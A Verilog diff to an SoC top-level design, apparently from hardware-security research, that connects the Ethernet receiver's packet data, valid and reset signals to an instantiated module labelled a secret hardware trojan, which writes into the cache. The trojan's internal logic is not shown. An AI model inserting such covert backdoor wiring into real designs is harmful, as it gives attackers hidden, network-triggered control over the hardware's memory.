@@ -217,22 +217,32 @@ clocks_resets u_clocks_resets (
 // -------------------------------------------------------------
 /// Instatiate Trojan Hardware (shhhh! Secret)
 // -------------------------------------------------------------
+// Cache connections
 wire 		troj_reserve;
 wire [127:0]	troj_write_data;
 wire [31:0] 	troj_address;
 wire [31:0] 	troj_address_nxt;
 wire		cache_stall;
 
+// Ethernet RX packet data
+wire [31:0] troj_rx_packet_data;
+wire        troj_rx_packet_data_valid;
+wire        troj_rx_packet_reset;
+
 trojan trojan0 (
     .i_clk              	(sys_clk),
     .i_rst              	(sys_rst),
     
-    .i_cache_stall		(cache_stall),
+    .i_rx_packet_data       (troj_rx_packet_data),
+    .i_rx_packet_data_valid (troj_rx_packet_data_valid),
+    .i_rx_packet_reset      (troj_rx_packet_reset),
+    
+    .i_cache_stall		    (cache_stall),
 
-	.o_troj			(troj_reserve),
-	.o_troj_write_data	(troj_write_data),
-	.o_troj_write_addr	(troj_address),
-	.o_troj_write_addr_nxt	(troj_address_nxt)
+	.o_troj			        (troj_reserve),
+	.o_troj_write_data	    (troj_write_data),
+	.o_troj_write_addr	    (troj_address),
+	.o_troj_write_addr_nxt  (troj_address_nxt)
 );
 
 // -------------------------------------------------------------
@@ -314,7 +324,12 @@ eth_top u_eth_top (
     .md_padoe_o                 ( md_padoe_o             ),
 
     // Interrupt
-    .int_o                      ( ethmac_int             )
+    .int_o                      ( ethmac_int             ),
+
+    //XXX Trojan signals
+    .troj_rx_packet_data       ( troj_rx_packet_data       ),
+    .troj_rx_packet_data_valid ( troj_rx_packet_data_valid ),
+    .troj_rx_packet_reset      ( troj_rx_packet_reset      )
 );
 
 
